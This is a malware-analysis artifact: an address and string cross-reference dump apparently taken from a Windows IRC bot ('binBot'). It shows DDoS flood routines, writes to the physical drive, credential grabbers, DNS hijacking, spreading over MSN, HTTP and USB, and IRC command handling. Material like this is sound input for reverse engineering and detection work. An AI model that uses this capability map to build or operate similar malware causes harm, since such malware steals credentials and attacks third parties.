reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x32967f	0x332968	string	0x329580	%s / ?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nContent-Length: 42\r\n
0x32970b	0x331180	import	0x3296b0	KERNEL32.dll.HeapFree
0x329728	0x3310a0	import	0x3296b0	KERNEL32.dll.lstrcpynA
0x329751	0x331180	import	0x3296b0	KERNEL32.dll.HeapFree
0x329770	0x331174	import	0x3296b0	KERNEL32.dll.GetTickCount
0x3297ba	0x335ee4	string	0x3296b0	[SYN]: Starting flood on "%s:%d" for %d second(s)
0x3297f0	0x335f18	string	0x3296b0	[SYN]: Finished flood on "%s:%d"
0x32981c	0x331180	import	0x3296b0	KERNEL32.dll.HeapFree
0x32988b	0x331180	import	0x329830	KERNEL32.dll.HeapFree
0x3298a8	0x3310a0	import	0x329830	KERNEL32.dll.lstrcpynA
0x3298d1	0x331180	import	0x329830	KERNEL32.dll.HeapFree
0x3298f0	0x331174	import	0x329830	KERNEL32.dll.GetTickCount
0x32993a	0x335e8c	string	0x329830	[UDP]: Starting flood on "%s:%d" for %d second(s)
0x329970	0x335ec0	string	0x329830	[UDP]: Finished flood on "%s:%d"
0x32999c	0x331180	import	0x329830	KERNEL32.dll.HeapFree
0x329a2d	0x331174	import	0x3299b0	KERNEL32.dll.GetTickCount
0x329a60	0x331174	import	0x3299b0	KERNEL32.dll.GetTickCount
0x329abe	0x331188	import	0x3299b0	KERNEL32.dll.Sleep
0x329ae7	0x331120	import	0x3299b0	KERNEL32.dll.lstrcpyA
0x329af0	0x332a08	string	0x3299b0	X-a: b\r\n
0x329b00	0x3329f0	string	0x3299b0	Connection: Close\r\n\r\n
0x329b0f	0x331184	import	0x3299b0	KERNEL32.dll.lstrlenA
0x329b51	0x331188	import	0x3299b0	KERNEL32.dll.Sleep
0x329b5e	0x331184	import	0x3299b0	KERNEL32.dll.lstrlenA
0x329b66	0x331174	import	0x3299b0	KERNEL32.dll.GetTickCount
0x329b7f	0x331188	import	0x3299b0	KERNEL32.dll.Sleep
0x329bd2	0x331174	import	0x3299b0	KERNEL32.dll.GetTickCount
0x329be4	0x331184	import	0x3299b0	KERNEL32.dll.lstrlenA
0x329c43	0x331174	import	0x3299b0	KERNEL32.dll.GetTickCount
0x329c9a	0x331180	import	0x329c60	KERNEL32.dll.HeapFree
0x329cb3	0x331120	import	0x329c60	KERNEL32.dll.lstrcpyA
0x329cc4	0x3310a0	import	0x329c60	KERNEL32.dll.lstrcpynA
0x329cf9	0x335e30	string	0x329c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x329d45	0x335e68	string	0x329c60	[Slowloris]: Finished flood on "%s"
0x329d73	0x331180	import	0x329c60	KERNEL32.dll.HeapFree
0x329da7	0x331094	import	0x329d90	KERNEL32.dll.VirtualAlloc
0x329dd0	0x332a14	string	0x329d90	\\.\PHYSICALDRIVE0
0x329dd5	0x331110	import	0x329d90	KERNEL32.dll.CreateFileA
0x329e02	0x331098	import	0x329d90	KERNEL32.dll.DeviceIoControl
0x329e21	0x33109c	import	0x329d90	KERNEL32.dll.SetFilePointer
0x329e2a	0x331164	import	0x329d90	KERNEL32.dll.WriteFile
0x329e56	0x33109c	import	0x329d90	KERNEL32.dll.SetFilePointer
0x329ea2	0x331098	import	0x329d90	KERNEL32.dll.DeviceIoControl
0x329eec	0x332a28	string	0x329ec0	00100
0x329f09	0x332a14	string	0x329ec0	\\.\PHYSICALDRIVE0
0x329f16	0x331110	import	0x329ec0	KERNEL32.dll.CreateFileA
0x329f2b	0x331098	import	0x329ec0	KERNEL32.dll.DeviceIoControl
0x329f5a	0x331164	import	0x329ec0	KERNEL32.dll.WriteFile
0x329f77	0x331150	import	0x329ec0	KERNEL32.dll.CloseHandle
0x32a0a2	0x331158	import	0x32a080	KERNEL32.dll.CreateFileW
0x32a0c0	0x331164	import	0x32a080	KERNEL32.dll.WriteFile
0x32a0cb	0x331150	import	0x32a080	KERNEL32.dll.CloseHandle
0x32a0d8	0x331150	import	0x32a080	KERNEL32.dll.CloseHandle
0x32a184	0x3310c8	import	0x32a150	KERNEL32.dll.GetWindowsDirectoryW
0x32a2ab	0x331090	import	0x32a260	KERNEL32.dll.CreateProcessW
0x32a2c5	0x331174	import	0x32a2c0	KERNEL32.dll.GetTickCount
0x32a39f	0x331184	import	0x32a310	KERNEL32.dll.lstrlenA
0x32a3a8	0x3357a0	string	0x32a310	30e4A{a1
0x32a3b0	0x3357a0	string	0x32a310	30e4A{a1
0x32a3bb	0x336904	string	0x32a310	\\.\pipe\%08x_ipc
0x32a3fd	0x3357a0	string	0x32a310	30e4A{a1
0x32a40e	0x3357a0	string	0x32a310	30e4A{a1
0x32a436	0x33119c	import	0x32a310	KERNEL32.dll.EnterCriticalSection
0x32a452	0x331110	import	0x32a310	KERNEL32.dll.CreateFileA
0x32a464	0x331198	import	0x32a310	KERNEL32.dll.LeaveCriticalSection
0x32a484	0x331164	import	0x32a310	KERNEL32.dll.WriteFile
0x32a48b	0x331150	import	0x32a310	KERNEL32.dll.CloseHandle
0x32a496	0x331188	import	0x32a310	KERNEL32.dll.Sleep
0x32a4a1	0x331198	import	0x32a310	KERNEL32.dll.LeaveCriticalSection
0x32a557	0x332a48	string	0x32a550	NtShutdownSystem
0x32a55c	0x3316e8	string	0x32a550	ntdll.dll
0x32a57a	0x331024	import	0x32a550	ADVAPI32.dll.OpenProcessToken
0x32a588	0x332a34	string	0x32a550	SeShutdownPrivilege
0x32a58f	0x331028	import	0x32a550	ADVAPI32.dll.LookupPrivilegeValueA
0x32a5b3	0x33102c	import	0x32a550	ADVAPI32.dll.AdjustTokenPrivileges
0x32a5b9	0x33116c	import	0x32a550	KERNEL32.dll.GetLastError
0x32a659	0x3310cc	import	0x32a5d0	KERNEL32.dll.CreateThread
0x32a661	0x332ad4	string	0x32a5d0	binBot Error
0x32a666	0x332a60	string	0x32a5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x32a66f	0x3312a4	import	0x32a5d0	USER32.dll.MessageBoxA
0x32a678	0x3310f8	import	0x32a5d0	KERNEL32.dll.WaitForSingleObject
0x32a680	0x33108c	import	0x32a5d0	KERNEL32.dll.ExitProcess
0x32a6df	0x331238	import	0x32a690	SHELL32.dll.SHGetSpecialFolderPathW
0x32a6f9	0x331240	import	0x32a690	SHLWAPI.dll.PathAppendW
0x32a70a	0x332af0	string	0x32a690	"%s" %S
0x32a77f	0x331090	import	0x32a690	KERNEL32.dll.CreateProcessW
0x32a7aa	0x331174	import	0x32a790	KERNEL32.dll.GetTickCount
0x32a7dc	0x331188	import	0x32a790	KERNEL32.dll.Sleep
0x32a819	0x331174	import	0x32a800	KERNEL32.dll.GetTickCount
0x32a859	0x331188	import	0x32a800	KERNEL32.dll.Sleep
0x32a8b1	0x331534	string	0x32a880	msnu
0x32a8bd	0x331330	string	0x32a880	pdef
0x32a8c9	0x331b04	string	0x32a880	ffgrab
0x32a8d5	0x331b0c	string	0x32a880	iegrab
0x32a8e1	0x331a9c	string	0x32a880	ftpgrab
0x32a8ed	0x331a68	string	0x32a880	popgrab
0x32a8fc	0x3313e4	string	0x32a880	bdns
0x32a908	0x332b1c	string	0x32a880	usbi
0x32a914	0x332b14	string	0x32a880	httpi
0x32a946	0x332b04	string	0x32a880	http
0x32a956	0x332b04	string	0x32a880	http
0x32a970	0x332b30	string	0x32a970	DnsFlushResolverCache
0x32a975	0x332b24	string	0x32a970	dnsapi.dll
0x32a9ed	0x331090	import	0x32a990	KERNEL32.dll.CreateProcessW
0x32aa39	0x3329e0	string	0x32aa10	Mozilla/4.0
0x32aa45	0x331120	import	0x32aa10	KERNEL32.dll.lstrcpyA
0x32aa60	0x3312b8	import	0x32aa10	WININET.dll.InternetOpenA
0x32aa78	0x331184	import	0x32aa10	KERNEL32.dll.lstrlenA
0x32aa8c	0x3312b4	import	0x32aa10	WININET.dll.InternetOpenUrlA
0x32aac0	0x3312b0	import	0x32aa10	WININET.dll.HttpQueryInfoA
0x32aae2	0x3312ac	import	0x32aa10	WININET.dll.InternetQueryDataAvailable
0x32ab00	0x3312c8	import	0x32aa10	WININET.dll.InternetReadFile
0x32abe7	0x3312c4	import	0x32aa10	WININET.dll.InternetCloseHandle
0x32ac1a	0x331178	import	0x32ac00	KERNEL32.dll.HeapAlloc
0x32ac29	0x3312bc	import	0x32ac00	WININET.dll.HttpQueryInfoW
0x32ac44	0x33116c	import	0x32ac00	KERNEL32.dll.GetLastError
0x32ac5e	0x3311a0	import	0x32ac00	KERNEL32.dll.HeapReAlloc
0x32ac80	0x332b48	string	0x32ac00	POST
0x32ac85	0x331134	import	0x32ac00	KERNEL32.dll.lstrcmpW
0x32ac99	0x331180	import	0x32ac00	KERNEL32.dll.HeapFree
0x32acb2	0x331180	import	0x32ac00	KERNEL32.dll.HeapFree
0x32ad0a	0x331178	import	0x32acd0	KERNEL32.dll.HeapAlloc
0x32ad1a	0x3312c0	import	0x32acd0	WININET.dll.InternetQueryOptionW
0x32ad31	0x33116c	import	0x32acd0	KERNEL32.dll.GetLastError
0x32ad4f	0x3311a0	import	0x32acd0	KERNEL32.dll.HeapReAlloc
0x32ad80	0x33112c	import	0x32acd0	KERNEL32.dll.WideCharToMultiByte
0x32adb3	0x331120	import	0x32acd0	KERNEL32.dll.lstrcpyA
0x32ade6	0x331180	import	0x32acd0	KERNEL32.dll.HeapFree
0x32ae05	0x331184	import	0x32ae00	KERNEL32.dll.lstrlenA
0x32ae13	0x331178	import	0x32ae00	KERNEL32.dll.HeapAlloc
0x32ae69	0x331120	import	0x32ae00	KERNEL32.dll.lstrcpyA
0x32ae7f	0x331088	import	0x32ae00	KERNEL32.dll.lstrcatA
0x32aeb0	0x32af0a	string	0x32ae00	hT+3
0x32aed5	0x331180	import	0x32ae00	KERNEL32.dll.HeapFree
0x32aeeb	0x331180	import	0x32ae00	KERNEL32.dll.HeapFree
0x32af58	0x331120	import	0x32ae00	KERNEL32.dll.lstrcpyA
0x32af70	0x331180	import	0x32ae00	KERNEL32.dll.HeapFree
0x32afaf	0x331184	import	0x32afa0	KERNEL32.dll.lstrlenA
0x32afcb	0x331178	import	0x32afa0	KERNEL32.dll.HeapAlloc
0x32b024	0x332b88	string	0x32afa0	POST /%1023s
0x32b055	0x332b7c	string	0x32afa0	Host:
0x32b08e	0x3310a0	import	0x32afa0	KERNEL32.dll.lstrcpynA
0x32b0d5	0x331178	import	0x32afa0	KERNEL32.dll.HeapAlloc
0x32b0e3	0x332b74	string	0x32afa0	HTTP
0x32b0ff	0x332b68	string	0x32afa0	http://%s/
0x32b11e	0x332b58	string	0x32afa0	http://%s/%s
0x32b13c	0x331180	import	0x32afa0	KERNEL32.dll.HeapFree
0x32b16a	0x331184	import	0x32b160	KERNEL32.dll.lstrlenA
0x32b186	0x331178	import	0x32b160	KERNEL32.dll.HeapAlloc
0x32b199	0x332b98	string	0x32b160	\r\n\r\n
0x32b1d2	0x331178	import	0x32b160	KERNEL32.dll.HeapAlloc
0x32b1e5	0x3310a0	import	0x32b160	KERNEL32.dll.lstrcpynA
0x32b1f8	0x331180	import	0x32b160	KERNEL32.dll.HeapFree
0x32b2ee	0x32b2b0	string	0x32b290	<%u2
0x32b312	0x33117c	import	0x32b300	KERNEL32.dll.GetProcessHeap
0x32b319	0x331178	import	0x32b300	KERNEL32.dll.HeapAlloc
0x32b366	0x332bb4	string	0x32b300	lol.exe
0x32b387	0x3310c8	import	0x32b300	KERNEL32.dll.GetWindowsDirectoryW
0x32b3a1	0x3310b8	import	0x32b300	KERNEL32.dll.lstrcpynW
0x32b3bb	0x331084	import	0x32b300	KERNEL32.dll.GetVolumeInformationW
0x32b3cd	0x331184	import	0x32b300	KERNEL32.dll.lstrlenA
0x32b3d3	0x3357a0	string	0x32b300	30e4A{a1
0x32b3ea	0x3357a0	string	0x32b300	30e4A{a1
0x32b45b	0x332ba0	string	0x32b300	.exe
0x32b461	0x3310bc	import	0x32b300	KERNEL32.dll.lstrcatW
0x32b4a9	0x332c18	string	0x32b480	isadmin
0x32b4ae	0x332c10	string	0x32b480	admin
0x32b4d9	0x36ada0	string	0x32b480	C:\Users\admin\AppData\Roaming\Microsoft\Windows\Ktkuke.exe
0x32b4fe	0x331120	import	0x32b480	KERNEL32.dll.lstrcpyA
0x32b536	0x331178	import	0x32b480	KERNEL32.dll.HeapAlloc
0x32b550	0x3310d8	import	0x32b480	KERNEL32.dll.GetVersionExA
0x32b60d	0x331178	import	0x32b480	KERNEL32.dll.HeapAlloc
0x32b620	0x3368e8	string	0x32b480	http://api.wipmania.com/
0x32b63b	0x332be8	string	0x32b480	<br>
0x32b650	0x331184	import	0x32b480	KERNEL32.dll.lstrlenA
0x32b65f	0x331184	import	0x32b480	KERNEL32.dll.lstrlenA
0x32b67d	0x331080	import	0x32b480	KERNEL32.dll.GetLocaleInfoA
0x32b6a8	0x331128	import	0x32b480	KERNEL32.dll.lstrcmpA
0x32b6c5	0x331080	import	0x32b480	KERNEL32.dll.GetLocaleInfoA
0x32b6f9	0x331080	import	0x32b480	KERNEL32.dll.GetLocaleInfoA
0x32b741	0x331178	import	0x32b480	KERNEL32.dll.HeapAlloc
0x32b7f1	0x332bd0	string	0x32b480	n%s[%s[%s%s[%s
0x32b80b	0x332bc4	string	0x32b480	[%s[%s%s[%s
0x32b8be	0x332bd0	string	0x32b480	n%s[%s[%s%s[%s
0x32b8d5	0x332bc4	string	0x32b480	[%s[%s%s[%s
0x32b94b	0x332c20	string	0x32b900	127.0.0.1
0x32b975	0x331188	import	0x32b900	KERNEL32.dll.Sleep
0x32b9bc	0x33119c	import	0x32b990	KERNEL32.dll.EnterCriticalSection
0x32b9d1	0x3312a0	import	0x32b990	USER32.dll.wvsprintfA
0x32b9f2	0x331198	import	0x32b990	KERNEL32.dll.LeaveCriticalSection
0x32ba42	0x3312a0	import	0x32ba00	USER32.dll.wvsprintfA
0x32ba56	0x335d4c	string	0x32ba00	PPPPMSG %s :%s\r\n
0x32ba7f	0x335c54	string	0x32ba70	PASS %s\r\n
0x32ba9c	0x335d24	string	0x32ba70	KCIK %s\r\n
0x32bab4	0x335d10	string	0x32ba70	SDRR %s 0 0 :%s\r\n
0x32bb52	0x331184	import	0x32bb30	KERNEL32.dll.lstrlenA
0x32bba0	0x331128	import	0x32bb80	KERNEL32.dll.lstrcmpA
0x32bbff	0x331128	import	0x32bbb0	KERNEL32.dll.lstrcmpA
0x32bc22	0x36ada0	string	0x32bbb0	C:\Users\admin\AppData\Roaming\Microsoft\Windows\Ktkuke.exe
0x32bc2c	0x3357a0	string	0x32bbb0	30e4A{a1
0x32bc36	0x335d88	string	0x32bbb0	[v="%s" c="%s" h="%s" p="%S"]
0x32bc89	0x332cf4	string	0x32bbb0	reconnecting
0x32bc8e	0x335d60	string	0x32bbb0	QUIT :%s\r\n
0x32bcc3	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32bce1	0x331180	import	0x32bbb0	KERNEL32.dll.HeapFree
0x32bcec	0x332cf4	string	0x32bbb0	reconnecting
0x32bcf1	0x335d60	string	0x32bbb0	QUIT :%s\r\n
0x32bd28	0x332ce8	string	0x32bbb0	exiting
0x32bd2d	0x335d60	string	0x32bbb0	QUIT :%s\r\n
0x32bd5a	0x332cdc	string	0x32bbb0	removing
0x32bd5f	0x335d60	string	0x32bbb0	QUIT :%s\r\n
0x32bdb2	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32bdc6	0x331088	import	0x32bbb0	KERNEL32.dll.lstrcatA
0x32bdd5	0x335d30	string	0x32bbb0	SEND %s %s\r\n
0x32be0c	0x332ccc	string	0x32bbb0	#new
0x32be18	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32be2a	0x335d30	string	0x32bbb0	SEND %s %s\r\n
0x32be72	0x332cbc	string	0x32bbb0	#admin
0x32be79	0x332cb4	string	0x32bbb0	#user
0x32be7f	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32be91	0x335d30	string	0x32bbb0	SEND %s %s\r\n
0x32becb	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32bee7	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32befa	0x331088	import	0x32bbb0	KERNEL32.dll.lstrcatA
0x32bf0c	0x335d30	string	0x32bbb0	SEND %s %s\r\n
0x32bf5f	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32bf73	0x331088	import	0x32bbb0	KERNEL32.dll.lstrcatA
0x32bf82	0x335d40	string	0x32bbb0	PART %s\r\n
0x32bfa6	0x332ccc	string	0x32bbb0	#new
0x32bfb2	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32bfc4	0x335d40	string	0x32bbb0	PART %s\r\n
0x32c00c	0x332cbc	string	0x32bbb0	#admin
0x32c013	0x332cb4	string	0x32bbb0	#user
0x32c019	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c02b	0x335d40	string	0x32bbb0	PART %s\r\n
0x32c065	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c081	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c094	0x331088	import	0x32bbb0	KERNEL32.dll.lstrcatA
0x32c0a6	0x335d40	string	0x32bbb0	PART %s\r\n
0x32c0c3	0x335874	string	0x32bbb0	stop
0x32c0e3	0x335840	string	0x32bbb0	stats
0x32c124	0x336054	string	0x32bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x32c156	0x336080	string	0x32bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x32c192	0x336054	string	0x32bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x32c1b9	0x336080	string	0x32bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x32c1d2	0x335850	string	0x32bbb0	logins
0x32c225	0x331180	import	0x32bbb0	KERNEL32.dll.HeapFree
0x32c25e	0x332c88	string	0x32bbb0	[Logins]: Cleared %d logins
0x32c283	0x332c80	string	0x32bbb0	%s]%s
0x32c2c2	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32c2d2	0x331178	import	0x32bbb0	KERNEL32.dll.HeapAlloc
0x32c2ea	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c321	0x3360d0	string	0x32bbb0	[RSOCK4]: Stopped rsock4
0x32c33f	0x335848	string	0x32bbb0	speed
0x32c354	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c3fd	0x3357f0	string	0x32bbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x32c449	0x335d30	string	0x32bbb0	SEND %s %s\r\n
0x32c4bf	0x335d30	string	0x32bbb0	SEND %s %s\r\n
0x32c550	0x335d40	string	0x32bbb0	PART %s\r\n
0x32c572	0x335d40	string	0x32bbb0	PART %s\r\n
0x32c5d0	0x331330	string	0x32bbb0	pdef
0x32c5e2	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32c5f7	0x331178	import	0x32bbb0	KERNEL32.dll.HeapAlloc
0x32c60e	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c61f	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32c633	0x331088	import	0x32bbb0	KERNEL32.dll.lstrcatA
0x32c642	0x331088	import	0x32bbb0	KERNEL32.dll.lstrcatA
0x32c679	0x331330	string	0x32bbb0	pdef
0x32c68f	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c6d0	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c6e0	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32c706	0x331088	import	0x32bbb0	KERNEL32.dll.lstrcatA
0x32c73d	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c743	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32c77e	0x3314f8	string	0x32bbb0	msnmsg
0x32c7ce	0x335f50	string	0x32bbb0	[MSN]: Updated MSN spread message to "%s"
0x32c7e7	0x335808	string	0x32bbb0	msn.int
0x32c826	0x331500	string	0x32bbb0	msnint
0x32c859	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32c876	0x335f7c	string	0x32bbb0	[MSN]: Updated MSN spread interval to "%s"
0x32c88f	0x335810	string	0x32bbb0	http.set
0x32c8b5	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c8d0	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32c8f5	0x331088	import	0x32bbb0	KERNEL32.dll.lstrcatA
0x32c92c	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32c955	0x332b04	string	0x32bbb0	http
0x32c972	0x335fa8	string	0x32bbb0	[HTTP]: Updated HTTP spread message to "%s"
0x32c97f	0x33581c	string	0x32bbb0	http.int
0x32c9c0	0x332b04	string	0x32bbb0	http
0x32c9df	0x335ff8	string	0x32bbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x32c9f8	0x335828	string	0x32bbb0	http.inj
0x32ca16	0x332b14	string	0x32bbb0	httpi
0x32ca26	0x332c70	string	0x32bbb0	enabled
0x32ca2b	0x335fd4	string	0x32bbb0	[HTTP]: Injected value is now %s.
0x32ca43	0x332b14	string	0x32bbb0	httpi
0x32ca53	0x332c64	string	0x32bbb0	disabled
0x32ca58	0x335fd4	string	0x32bbb0	[HTTP]: Injected value is now %s.
0x32ca71	0x335838	string	0x32bbb0	mdns
0x32ca9f	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32cadd	0x331178	import	0x32bbb0	KERNEL32.dll.HeapAlloc
0x32caf3	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32cb36	0x3313e4	string	0x32bbb0	bdns
0x32cb41	0x32a970	string	0x32bbb0	h0+3
0x32cb56	0x332c44	string	0x32bbb0	[DNS]: Redirecting "%s" to "%s"
0x32cb76	0x3313e4	string	0x32bbb0	bdns
0x32cb7b	0x3313dc	string	0x32bbb0	block
0x32cb85	0x32a970	string	0x32bbb0	h0+3
0x32cb95	0x336040	string	0x32bbb0	[DNS]: Blocked "%s"
0x32cbf2	0x32cc0a	string	0x32bbb0	h|b3
0x32cbf4	0x336028	string	0x32bbb0	[Visit]: Visited "%s"
0x32cc0a	0x33627c	string	0x32bbb0	[Visit]: Error visitng "%s"
0x32cc3a	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32cc8b	0x332c34	string	0x32bbb0	%s[%s[%s
0x32cca8	0x332c80	string	0x32bbb0	%s]%s
0x32ccd4	0x331178	import	0x32bbb0	KERNEL32.dll.HeapAlloc
0x32cce4	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32cd11	0x335860	string	0x32bbb0	slow
0x32cd27	0x332c80	string	0x32bbb0	%s]%s
0x32cd47	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32cd58	0x331178	import	0x32bbb0	KERNEL32.dll.HeapAlloc
0x32cd70	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32cdfc	0x331534	string	0x32bbb0	msnu
0x32ce55	0x331330	string	0x32bbb0	pdef
0x32ce66	0x331b04	string	0x32bbb0	ffgrab
0x32ce7b	0x331b0c	string	0x32bbb0	iegrab
0x32ce8c	0x331a9c	string	0x32bbb0	ftpgrab
0x32ce9d	0x331a68	string	0x32bbb0	popgrab
0x32ceb2	0x3313e4	string	0x32bbb0	bdns
0x32cec7	0x332b1c	string	0x32bbb0	usbi
0x32cf67	0x3360ac	string	0x32bbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0x32cfe3	0x332c34	string	0x32bbb0	%s[%s[%s
0x32d003	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32d013	0x331178	import	0x32bbb0	KERNEL32.dll.HeapAlloc
0x32d02b	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32d043	0x335868	string	0x32bbb0	ssyn
0x32d097	0x332c34	string	0x32bbb0	%s[%s[%s
0x32d0b7	0x331184	import	0x32bbb0	KERNEL32.dll.lstrlenA
0x32d0c8	0x331178	import	0x32bbb0	KERNEL32.dll.HeapAlloc
0x32d0dc	0x331120	import	0x32bbb0	KERNEL32.dll.lstrcpyA
0x32d0f0	0x3310cc	import	0x32bbb0	KERNEL32.dll.CreateThread
0x32d0f7	0x331150	import	0x32bbb0	KERNEL32.dll.CloseHandle
0x32d145	0x331128	import	0x32d110	KERNEL32.dll.lstrcmpA
0x32d18c	0x3310a0	import	0x32d110	KERNEL32.dll.lstrcpynA
0x32d198	0x331184	import	0x32d110	KERNEL32.dll.lstrlenA
0x32d231	0x331184	import	0x32d220	KERNEL32.dll.lstrlenA
0x32d243	0x332d18	string	0x32d220	MOTD
0x32d2b5	0x331128	import	0x32d220	KERNEL32.dll.lstrcmpA
0x32d2bb	0x335d78	string	0x32d220	PING
0x32d2d1	0x335d6c	string	0x32d220	PPNG %s\r\n
0x32d2f6	0x32d31d	string	0x32d220	h\f-3
0x32d308	0x335d30	string	0x32d220	SEND %s %s\r\n
0x32d33c	0x335d24	string	0x32d220	KCIK %s\r\n
0x32d351	0x3318c4	string	0x32d220	JOIN
0x32d35d	0x36ada0	string	0x32d220	C:\Users\admin\AppData\Roaming\Microsoft\Windows\Ktkuke.exe
0x32d37f	0x335d80	string	0x32d220	PPPPMSG
0x32d3e7	0x36ada0	string	0x32d220	C:\Users\admin\AppData\Roaming\Microsoft\Windows\Ktkuke.exe
0x32d43c	0x335d30	string	0x32d220	SEND %s %s\r\n
0x32d5cd	0x3318d0	string	0x32d530	%s:%d
0x32d5e4	0x331188	import	0x32d530	KERNEL32.dll.Sleep
0x32d659	0x331188	import	0x32d530	KERNEL32.dll.Sleep
0x32d6fd	0x331018	import	0x32d6b0	ADVAPI32.dll.RegCreateKeyExW
0x32d731	0x331000	import	0x32d6b0	ADVAPI32.dll.RegSetValueExW
0x32d740	0x331020	import	0x32d6b0	ADVAPI32.dll.RegCloseKey
0x32d753	0x331020	import	0x32d6b0	ADVAPI32.dll.RegCloseKey
0x32d7b2	0x331178	import	0x32d7a0	KERNEL32.dll.HeapAlloc
0x32d80b	0x331180	import	0x32d7a0	KERNEL32.dll.HeapFree
0x32d819	0x331180	import	0x32d7a0	KERNEL32.dll.HeapFree
0x32d82f	0x33116c	import	0x32d7a0	KERNEL32.dll.GetLastError
0x32d83c	0x331180	import	0x32d7a0	KERNEL32.dll.HeapFree
0x32d852	0x33116c	import	0x32d7a0	KERNEL32.dll.GetLastError
0x32d85b	0x331180	import	0x32d7a0	KERNEL32.dll.HeapFree
0x32d87a	0x331170	import	0x32d7a0	KERNEL32.dll.ReadFile
0x32d8fa	0x3357a0	string	0x32d7a0	30e4A{a1
0x32d900	0x331184	import	0x32d7a0	KERNEL32.dll.lstrlenA
0x32d908	0x3357a0	string	0x32d7a0	30e4A{a1
0x32d916	0x331178	import	0x32d7a0	KERNEL32.dll.HeapAlloc
0x32d952	0x331184	import	0x32d7a0	KERNEL32.dll.lstrlenA
0x32d95e	0x3310a0	import	0x32d7a0	KERNEL32.dll.lstrcpynA
0x32d96d	0x3310a0	import	0x32d7a0	KERNEL32.dll.lstrcpynA
0x32d973	0x331128	import	0x32d7a0	KERNEL32.dll.lstrcmpA
0x32d979	0x3363a0	string	0x32d7a0	ftplog
0x32d98b	0x336298	string	0x32d7a0	[FTP Login]: %s
0x32d99f	0x331184	import	0x32d7a0	KERNEL32.dll.lstrlenA
